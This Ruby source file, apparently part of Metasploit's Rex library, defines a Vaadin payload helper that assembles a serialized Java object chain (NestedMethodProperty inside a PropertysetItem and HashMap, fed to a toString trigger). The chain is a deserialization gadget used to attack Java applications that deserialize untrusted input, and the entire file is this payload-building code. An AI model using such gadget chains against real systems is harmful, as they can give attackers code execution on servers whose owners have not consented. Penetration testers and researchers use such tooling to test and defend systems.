# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Vaadin
          def self.make_get_property(obj, name)
            prop = Model::JavaObject.new('Lcom/vaadin/data/util/NestedMethodProperty;', 
                                         'propertyName' => name,
                                         'instance' => obj)
            propset = Model::JavaObject.new('Lcom/vaadin/data/util/PropertysetItem;', 
                                            'map' => Model::JavaObject.new('Ljava/util/HashMap;', 
                                                                           'elements' => { name => prop }),
                                            'list' => Model::JavaObject.new('Ljava/util/LinkedList;', 'elements' => [name]))
            Util.make_tostring(propset)
          end
        end
      end
    end
  end
end
